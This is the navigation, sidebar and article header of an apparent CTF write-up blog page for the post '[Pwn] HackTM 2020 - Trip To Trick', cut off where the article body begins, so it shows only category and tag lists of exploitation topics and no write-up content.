</div>


</div>
      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
    </div>
    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
      <ul class="nav navbar-nav main-nav menu-highlight">
        
        
        <li class="menu-item menu-item-home">
          <a href="/.">
            
            <i class="icon icon-home-fill"></i>
            
            <span class="menu-title">Home</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-archives">
          <a href="/archives">
            
            <i class="icon icon-archives-fill"></i>
            
            <span class="menu-title">Archives</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-categories">
          <a href="/categories">
            
            <i class="icon icon-folder"></i>
            
            <span class="menu-title">Categories</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-tags">
          <a href="/tags">
            
            <i class="icon icon-tags"></i>
            
            <span class="menu-title">Tags</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-about">
          <a href="/about">
            
            <i class="icon icon-users"></i>
            
            <span class="menu-title">About</span>
          </a>
        </li>
        
      </ul>
      
	
    <ul class="social-links">
    	
        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
        
        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
        
        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
        
    </ul>

    </nav>
  </div>
</header>

  
    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    
      <div class="widget">
    <h3 class="widget-title">Board</h3>
    <div class="widget-body">
        <div id="board">
            <div class="content">
                <p>Behind each exploit there is a history of creativity and incredible knowledge.</p>
            </div>
        </div>
    </div>
</div>

    
      
  <div class="widget">
    <h3 class="widget-title">Categories</h3>
    <div class="widget-body">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Electronics/">Electronics</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Forensics/">Forensics</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Misc/">Misc</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Network/">Network</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a><span class="category-list-count">37</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/Android/">Android</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/Sandbox/">Sandbox</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/Sandbox/Javascript/">Javascript</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/Sandbox/Python/">Python</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/">x64</a><span class="category-list-count">26</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Format-String/">Format String</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/">Glibc Malloc</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/Fast-Bin-Dup/">Fast Bin Dup</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/House-of-Force/">House of Force</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/House-of-Orange/">House of Orange</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/IO-FILE/">IO_FILE</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/Off-By-One/">Off By One</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/Tcache/">Tcache</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/Tcache/House-of-Spirit/">House of Spirit</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-dup/">tcache_dup</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-perthread-struct/">tcache_perthread_struct</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning/">tcache_poisoning</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/Unlink/">Unlink</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Glibc-Malloc/Unsorted-Bin-Attack/">Unsorted Bin Attack</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Heap-Overflow/">Heap Overflow</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Integer-Overflow/">Integer Overflow</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Stack-Issue/">Stack Issue</a><span class="category-list-count">10</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Stack-Issue/Canary-Leak/">Canary Leak</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x64/Stack-Issue/Stack-Overflow/">Stack Overflow</a><span class="category-list-count">10</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x86/">x86</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x86/Format-String/">Format String</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x86/Stack-Issue/">Stack Issue</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/x86/Stack-Issue/Stack-Overflow/">Stack Overflow</a><span class="category-list-count">3</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Stego/">Stego</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><span class="category-list-count">21</span></li></ul>
    </div>
  </div>


    
      
  <div class="widget">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget-body tagcloud">
      <a href="/tags/34C3ctf2017/" style="font-size: 13px;">34C3ctf2017</a> <a href="/tags/35C3/" style="font-size: 13.08px;">35C3</a> <a href="/tags/36c3/" style="font-size: 13px;">36c3</a> <a href="/tags/3DS2017/" style="font-size: 13.25px;">3DS2017</a> <a href="/tags/InCTF2018/" style="font-size: 13.17px;">InCTF2018</a> <a href="/tags/LTE/" style="font-size: 13px;">LTE</a> <a href="/tags/Misc/" style="font-size: 13px;">Misc</a> <a href="/tags/ROP/" style="font-size: 13px;">ROP</a> <a href="/tags/RSA/" style="font-size: 13.17px;">RSA</a> <a href="/tags/TAMUctf/" style="font-size: 13px;">TAMUctf</a> <a href="/tags/X-Forwarded-For/" style="font-size: 13px;">X-Forwarded-For</a> <a href="/tags/adb/" style="font-size: 13px;">adb</a> <a href="/tags/aero2020/" style="font-size: 13px;">aero2020</a> <a href="/tags/aes/" style="font-size: 13.17px;">aes</a> <a href="/tags/android/" style="font-size: 13px;">android</a> <a href="/tags/asis2017/" style="font-size: 13px;">asis2017</a> <a href="/tags/asisfinals2019/" style="font-size: 13px;">asisfinals2019</a> <a href="/tags/assembly/" style="font-size: 13px;">assembly</a> <a href="/tags/autopsy/" style="font-size: 13px;">autopsy</a> <a href="/tags/backdoorctf/" style="font-size: 13.17px;">backdoorctf</a> <a href="/tags/backdoorctf2019/" style="font-size: 13px;">backdoorctf2019</a> <a href="/tags/base64/" style="font-size: 13px;">base64</a> <a href="/tags/bgb/" style="font-size: 13px;">bgb</a> <a href="/tags/binwalk/" style="font-size: 13.08px;">binwalk</a> <a href="/tags/blackbox/" style="font-size: 13px;">blackbox</a> <a href="/tags/blindSignatures/" style="font-size: 13px;">blindSignatures</a> <a href="/tags/blindSqli/" style="font-size: 13px;">blindSqli</a> <a href="/tags/blindsqli/" style="font-size: 13.08px;">blindsqli</a> <a href="/tags/bmp/" style="font-size: 13px;">bmp</a> <a href="/tags/boot-sector/" style="font-size: 13px;">boot_sector</a> <a href="/tags/bruteforce/" style="font-size: 13.33px;">bruteforce</a> <a href="/tags/bsidesSF/" style="font-size: 13.17px;">bsidesSF</a> <a href="/tags/byte2byte/" style="font-size: 13px;">byte2byte</a> <a href="/tags/bytebybyte/" style="font-size: 13.08px;">bytebybyte</a> <a href="/tags/c/" style="font-size: 13px;">c++</a> <a href="/tags/ccc2019ctf/" style="font-size: 13px;">ccc2019ctf</a> <a href="/tags/cgi/" style="font-size: 13.08px;">cgi</a> <a href="/tags/circuits/" style="font-size: 13px;">circuits</a> <a href="/tags/comments/" style="font-size: 13px;">comments</a> <a href="/tags/compiled/" style="font-size: 13px;">compiled</a> <a href="/tags/cookies/" style="font-size: 13px;">cookies</a> <a href="/tags/cpa/" style="font-size: 13px;">cpa</a> <a href="/tags/crypto/" style="font-size: 13.5px;">crypto</a> <a href="/tags/cryptoApi/" style="font-size: 13px;">cryptoApi</a> <a href="/tags/csaw/" style="font-size: 13.58px;">csaw</a> <a href="/tags/csaw2019/" style="font-size: 13px;">csaw2019</a> <a href="/tags/dicectf2021/" style="font-size: 13px;">dicectf2021</a> <a href="/tags/dictionaryAttack/" style="font-size: 13px;">dictionaryAttack</a> <a href="/tags/differential/" style="font-size: 13px;">differential</a> <a href="/tags/directorylisting/" style="font-size: 13px;">directorylisting</a> <a href="/tags/discrete-log/" style="font-size: 13px;">discrete log</a> <a href="/tags/disk/" style="font-size: 13px;">disk</a> <a href="/tags/django/" style="font-size: 13px;">django</a> <a href="/tags/docker/" style="font-size: 13px;">docker</a> <a href="/tags/double-free/" style="font-size: 13.25px;">double_free</a> <a href="/tags/ecb/" style="font-size: 13.08px;">ecb</a> <a href="/tags/electronics/" style="font-size: 13px;">electronics</a> <a href="/tags/elf/" style="font-size: 13px;">elf</a> <a href="/tags/elgamal/" style="font-size: 13px;">elgamal</a> <a href="/tags/emulator/" style="font-size: 13px;">emulator</a> <a href="/tags/encryptCTF/" style="font-size: 13px;">encryptCTF</a> <a href="/tags/encryption/" style="font-size: 13px;">encryption</a> <a href="/tags/exceptions/" style="font-size: 13px;">exceptions</a> <a href="/tags/exeResources/" style="font-size: 13px;">exeResources</a> <a href="/tags/fastbindup/" style="font-size: 13px;">fastbindup</a> <a href="/tags/file-stream/" style="font-size: 13.17px;">file_stream</a> <a href="/tags/filterbypass/" style="font-size: 13.08px;">filterbypass</a> <a href="/tags/fireshell2020/" style="font-size: 13px;">fireshell2020</a> <a href="/tags/flask/" style="font-size: 13px;">flask</a> <a href="/tags/forensics/" style="font-size: 13.67px;">forensics</a> <a href="/tags/format-string/" style="font-size: 13px;">format_string</a> <a href="/tags/formatstring/" style="font-size: 13.5px;">formatstring</a> <a href="/tags/gameboy/" style="font-size: 13.08px;">gameboy</a> <a href="/tags/gdb/" style="font-size: 13px;">gdb</a> <a href="/tags/gdbserver/" style="font-size: 13px;">gdbserver</a> <a href="/tags/gethost/" style="font-size: 13px;">gethost</a> <a href="/tags/ghidra/" style="font-size: 13px;">ghidra</a> <a href="/tags/go/" style="font-size: 13.08px;">go</a> <a href="/tags/golang/" style="font-size: 13px;">golang</a> <a href="/tags/guessing/" style="font-size: 13px;">guessing</a> <a href="/tags/hacktm2020/" style="font-size: 13px;">hacktm2020</a> <a href="/tags/hash/" style="font-size: 13px;">hash</a> <a href="/tags/hashcat/" style="font-size: 13.08px;">hashcat</a> <a href="/tags/heap/" style="font-size: 13.42px;">heap</a> <a href="/tags/heap-overflow/" style="font-size: 13.08px;">heap_overflow</a> <a href="/tags/hex2bin/" style="font-size: 13px;">hex2bin</a> <a href="/tags/hitcon2018/" style="font-size: 13px;">hitcon2018</a> <a href="/tags/homomorphic/" style="font-size: 13px;">homomorphic</a> <a href="/tags/house-of-spirit/" style="font-size: 13px;">house_of_spirit</a> <a href="/tags/houseoforange/" style="font-size: 13px;">houseoforange</a> <a href="/tags/hqli/" style="font-size: 13px;">hqli</a> <a href="/tags/httpauth/" style="font-size: 13px;">httpauth</a> <a href="/tags/i386/" style="font-size: 13px;">i386</a> <a href="/tags/ida/" style="font-size: 13.25px;">ida</a> <a href="/tags/inctf2017/" style="font-size: 13px;">inctf2017</a> <a href="/tags/index/" style="font-size: 13px;">index</a> <a href="/tags/intel-hex/" style="font-size: 13px;">intel_hex</a> <a href="/tags/io-file/" style="font-size: 13.33px;">io_file</a> <a href="/tags/io-file-struct/" style="font-size: 13.33px;">io_file_struct</a> <a href="/tags/jailescape/" style="font-size: 13px;">jailescape</a> <a href="/tags/java/" style="font-size: 13.08px;">java</a> <a href="/tags/javascript/" style="font-size: 13px;">javascript</a> <a href="/tags/javascriptinterfaces/" style="font-size: 13px;">javascriptinterfaces</a> <a href="/tags/jquery/" style="font-size: 13px;">jquery</a> <a href="/tags/jtr/" style="font-size: 13px;">jtr</a> <a href="/tags/jump-middle-instruction/" style="font-size: 13px;">jump_middle_instruction</a> <a href="/tags/kasperskyCtf/" style="font-size: 13px;">kasperskyCtf</a> <a href="/tags/keyboard/" style="font-size: 13px;">keyboard</a> <a href="/tags/kidpod2019/" style="font-size: 13px;">kidpod2019</a> <a href="/tags/kipod2019/" style="font-size: 13px;">kipod2019</a> <a href="/tags/laplace/" style="font-size: 13px;">laplace</a> <a href="/tags/lcg/" style="font-size: 13px;">lcg</a> <a href="/tags/led/" style="font-size: 13px;">led</a> <a href="/tags/lfi/" style="font-size: 13.25px;">lfi</a> <a href="/tags/logic/" style="font-size: 13px;">logic</a> <a href="/tags/login/" style="font-size: 13px;">login</a> <a href="/tags/luks/" style="font-size: 13.08px;">luks</a> <a href="/tags/mailSpoofing/" style="font-size: 13px;">mailSpoofing</a> <a href="/tags/malloc-usable-size/" style="font-size: 13px;">malloc_usable_size</a> <a href="/tags/malware/" style="font-size: 13.17px;">malware</a> <a href="/tags/masterkey/" style="font-size: 13px;">masterkey</a> <a href="/tags/mbr/" style="font-size: 13.08px;">mbr</a> <a href="/tags/md5/" style="font-size: 13.08px;">md5</a> <a href="/tags/memory/" style="font-size: 13px;">memory</a> <a href="/tags/misc/" style="font-size: 13.17px;">misc</a> <a href="/tags/mmap/" style="font-size: 13px;">mmap</a> <a href="/tags/mongodb/" style="font-size: 13px;">mongodb</a> <a href="/tags/mooshak/" style="font-size: 13px;">mooshak</a> <a href="/tags/mouse/" style="font-size: 13px;">mouse</a> <a href="/tags/multiplexer/" style="font-size: 13px;">multiplexer</a> <a href="/tags/n1ctf2019/" style="font-size: 13px;">n1ctf2019</a> <a href="/tags/nasm/" style="font-size: 13px;">nasm</a> <a href="/tags/nativelibraries/" style="font-size: 13px;">nativelibraries</a> <a href="/tags/network/" style="font-size: 13.08px;">network</a> <a href="/tags/no-gmb/" style="font-size: 13.08px;">no$gmb</a> <a href="/tags/noSql/" style="font-size: 13px;">noSql</a> <a href="/tags/nodejs/" style="font-size: 13px;">nodejs</a> <a href="/tags/nullcon2020/" style="font-size: 13.08px;">nullcon2020</a> <a href="/tags/obfuscation/" style="font-size: 13px;">obfuscation</a> <a href="/tags/off-by-one/" style="font-size: 13.08px;">off_by_one</a> <a href="/tags/offbyone/" style="font-size: 13px;">offbyone</a> <a href="/tags/orderby/" style="font-size: 13px;">orderby</a> <a href="/tags/pallier/" style="font-size: 13px;">pallier</a> <a href="/tags/partitions/" style="font-size: 13px;">partitions</a> <a href="/tags/passwordreset/" style="font-size: 13px;">passwordreset</a> <a href="/tags/pcap/" style="font-size: 13.17px;">pcap</a> <a href="/tags/pctf2020/" style="font-size: 13px;">pctf2020</a> <a href="/tags/perl/" style="font-size: 13.08px;">perl</a> <a href="/tags/php/" style="font-size: 13px;">php</a> <a href="/tags/png/" style="font-size: 13px;">png</a> <a href="/tags/power-analysis/" style="font-size: 13px;">power_analysis</a> <a href="/tags/powershell/" style="font-size: 13px;">powershell</a> <a href="/tags/preload/" style="font-size: 13px;">preload</a> <a href="/tags/puzzle/" style="font-size: 13px;">puzzle</a> <a href="/tags/pwn/" style="font-size: 13.83px;">pwn</a> <a href="/tags/pwn2win2019/" style="font-size: 13px;">pwn2win2019</a> <a href="/tags/pwn2winctf/" style="font-size: 13.17px;">pwn2winctf</a> <a href="/tags/pwnthybytes2019/" style="font-size: 13px;">pwnthybytes2019</a> <a href="/tags/pyjail/" style="font-size: 13px;">pyjail</a> <a href="/tags/python/" style="font-size: 13.42px;">python</a> <a href="/tags/python3/" style="font-size: 13px;">python3</a> <a href="/tags/python-sandbox/" style="font-size: 13px;">python_sandbox</a> <a href="/tags/pythonserver/" style="font-size: 13.08px;">pythonserver</a> <a href="/tags/qemu/" style="font-size: 13px;">qemu</a> <a href="/tags/quic/" style="font-size: 13px;">quic</a> <a href="/tags/r2script/" style="font-size: 13px;">r2script</a> <a href="/tags/radare2/" style="font-size: 13.25px;">radare2</a> <a href="/tags/radare2-script/" style="font-size: 13px;">radare2_script</a> <a href="/tags/random/" style="font-size: 13px;">random</a> <a href="/tags/randomness/" style="font-size: 13px;">randomness</a> <a href="/tags/redpwnctf2017/" style="font-size: 13.08px;">redpwnctf2017</a> <a href="/tags/regex/" style="font-size: 13.08px;">regex</a> <a href="/tags/ret2libc/" style="font-size: 13.17px;">ret2libc</a> <a href="/tags/retToLibc/" style="font-size: 13px;">retToLibc</a> <a href="/tags/reverse/" style="font-size: 13.92px;">reverse</a> <a href="/tags/rop/" style="font-size: 13.5px;">rop</a> <a href="/tags/sandbox/" style="font-size: 13.08px;">sandbox</a> <a href="/tags/seccon2017/" style="font-size: 13.08px;">seccon2017</a> <a href="/tags/seccon2018/" style="font-size: 13px;">seccon2018</a> <a href="/tags/seccon2019/" style="font-size: 13px;">seccon2019</a> <a href="/tags/sessionkey/" style="font-size: 13px;">sessionkey</a> <a href="/tags/sha256/" style="font-size: 13px;">sha256</a> <a href="/tags/shellcode/" style="font-size: 13.17px;">shellcode</a> <a href="/tags/shellshock/" style="font-size: 13px;">shellshock</a> <a href="/tags/sql/" style="font-size: 13px;">sql</a> <a href="/tags/sqli/" style="font-size: 13.25px;">sqli</a> <a href="/tags/sqlinjection/" style="font-size: 13px;">sqlinjection</a> <a href="/tags/squarectf/" style="font-size: 13.08px;">squarectf</a> <a href="/tags/ssti/" style="font-size: 13.08px;">ssti</a> <a href="/tags/stack-overflow/" style="font-size: 13.75px;">stack_overflow</a> <a href="/tags/stackcanary/" style="font-size: 13.08px;">stackcanary</a> <a href="/tags/stackoverflow/" style="font-size: 13px;">stackoverflow</a> <a href="/tags/statically-linked/" style="font-size: 13px;">statically_linked</a> <a href="/tags/std-string/" style="font-size: 13px;">std::string</a> <a href="/tags/stegano/" style="font-size: 13px;">stegano</a> <a href="/tags/steganography/" style="font-size: 13px;">steganography</a> <a href="/tags/stego/" style="font-size: 13.17px;">stego</a> <a href="/tags/swapaddresses/" style="font-size: 13px;">swapaddresses</a> <a href="/tags/tcache/" style="font-size: 13px;">tcache</a> <a href="/tags/tcache-perthread-struct/" style="font-size: 13px;">tcache_perthread_struct</a> <a href="/tags/tcache-poisoning/" style="font-size: 13.08px;">tcache_poisoning</a> <a href="/tags/terminal-characters/" style="font-size: 13px;">terminal_characters</a> <a href="/tags/tokyoWesterns2017/" style="font-size: 13px;">tokyoWesterns2017</a> <a href="/tags/tpctf2017/" style="font-size: 13.17px;">tpctf2017</a> <a href="/tags/transistor/" style="font-size: 13px;">transistor</a> <a href="/tags/tshark/" style="font-size: 13.08px;">tshark</a> <a href="/tags/tuctf2017/" style="font-size: 13px;">tuctf2017</a> <a href="/tags/tuctf2018/" style="font-size: 13.08px;">tuctf2018</a> <a href="/tags/unlink/" style="font-size: 13px;">unlink</a> <a href="/tags/unserialization/" style="font-size: 13px;">unserialization</a> <a href="/tags/uri/" style="font-size: 13px;">uri</a> <a href="/tags/urigethost/" style="font-size: 13px;">urigethost</a> <a href="/tags/usb/" style="font-size: 13.08px;">usb</a> <a href="/tags/use-after-free/" style="font-size: 13.08px;">use_after_free</a> <a href="/tags/utctf2020/" style="font-size: 13px;">utctf2020</a> <a href="/tags/volatility/" style="font-size: 13px;">volatility</a> <a href="/tags/volgactf2019/" style="font-size: 13.08px;">volgactf2019</a> <a href="/tags/vpnssl/" style="font-size: 13px;">vpnssl</a> <a href="/tags/wasm/" style="font-size: 13px;">wasm</a> <a href="/tags/web/" style="font-size: 14px;">web</a> <a href="/tags/whitespace-steganography/" style="font-size: 13px;">whitespace_steganography</a> <a href="/tags/windowsBinary/" style="font-size: 13px;">windowsBinary</a> <a href="/tags/wireshark/" style="font-size: 13.17px;">wireshark</a> <a href="/tags/xmlqueries/" style="font-size: 13px;">xmlqueries</a> <a href="/tags/xor/" style="font-size: 13.5px;">xor</a> <a href="/tags/xslt/" style="font-size: 13px;">xslt</a> <a href="/tags/xss/" style="font-size: 13px;">xss</a> <a href="/tags/zip/" style="font-size: 13px;">zip</a> <a href="/tags/zip2john/" style="font-size: 13px;">zip2john</a> <a href="/tags/zsteg/" style="font-size: 13px;">zsteg</a>
    </div>
  </div>

    
      
  <div class="widget">
    <h3 class="widget-title">Archive</h3>
    <div class="widget-body">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a><span class="archive-list-count">1</span></li></ul>
    </div>
  </div>


    
      
  <div class="widget">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget-body">
      <ul class="recent-post-list list-unstyled no-thumbnail">
        
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
              </p>
              <p class="item-title">
                <a href="/2022/09/06/Pwn-BalsnCTF2022-Flag-Market-1/" class="title">[Pwn] BalsnCTF2022 - Flag Market 1</a>
              </p>
              <p class="item-date">
                <time datetime="2022-09-06T04:05:52.000Z" itemprop="datePublished">2022-09-06</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/Android/">Android</a>
              </p>
              <p class="item-title">
                <a href="/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/" class="title">[Pwn] WMCTF2022 - WM Baby Droid</a>
              </p>
              <p class="item-date">
                <time datetime="2022-08-23T01:05:21.345Z" itemprop="datePublished">2022-08-23</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
              </p>
              <p class="item-title">
                <a href="/2021/02/08/Pwn-DiceCTF2021-flippidy/" class="title">[Pwn] DiceCTF2021 - flippidy</a>
              </p>
              <p class="item-date">
                <time datetime="2021-02-08T06:03:26.000Z" itemprop="datePublished">2021-02-08</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                <a class="category-link" href="/categories/Misc/">Misc</a>
              </p>
              <p class="item-title">
                <a href="/2020/04/20/Misc-PCTF2020-golf-so/" class="title">[Misc] PCTF2020 - golf.so</a>
              </p>
              <p class="item-date">
                <time datetime="2020-04-20T12:04:00.000Z" itemprop="datePublished">2020-04-20</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
              </p>
              <p class="item-title">
                <a href="/2020/03/23/Pwn-FireShell-CTF-2020-FireHTTPD/" class="title">[Pwn] FireShell CTF 2020 - FireHTTPD</a>
              </p>
              <p class="item-date">
                <time datetime="2020-03-23T00:45:41.000Z" itemprop="datePublished">2020-03-23</time>
              </p>
            </div>
          </li>
          
      </ul>
    </div>
  </div>
  

    
  </div>
</aside>

  
  
<main class="main" role="main">
  <div class="content">
  <article id="post-Pwn-HackTM-2020-Trip-To-Trick" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
    
    <div class="article-header">
      
        
  
    <h1 class="article-title" itemprop="name">
      [Pwn] HackTM 2020 - Trip To Trick
    </h1>
  

      
      <div class="article-meta">
        <span class="article-date">
    <i class="icon icon-calendar-check"></i>
	<a href="/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/" class="article-date">
	  <time datetime="2020-02-05T15:46:42.000Z" itemprop="datePublished">2020-02-05</time>
	</a>
</span>
        
  <span class="article-category">
    <i class="icon icon-folder"></i>
    <a class="article-category-link" href="/categories/Pwn/">Pwn</a>►<a class="article-category-link" href="/categories/Pwn/x64/">x64</a>►<a class="article-category-link" href="/categories/Pwn/x64/Glibc-Malloc/">Glibc Malloc</a>►<a class="article-category-link" href="/categories/Pwn/x64/Glibc-Malloc/IO-FILE/">IO_FILE</a>
  </span>

        
  <span class="article-tag">
    <i class="icon icon-tags"></i>
	<a class="article-tag-link" href="/tags/file-stream/">file_stream</a>, <a class="article-tag-link" href="/tags/hacktm2020/">hacktm2020</a>, <a class="article-tag-link" href="/tags/io-file/">io_file</a>, <a class="article-tag-link" href="/tags/io-file-struct/">io_file_struct</a>
  </span>


        

        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/#comments" class="article-comment-link">Comments</a></span>
        
	
		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 4,074(words)</span>
	
	
		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 25(minutes)</span>
	

      </div>
    </div>
    <div class="article-entry marked-body" itemprop="articleBody">
      
        <blockquote>
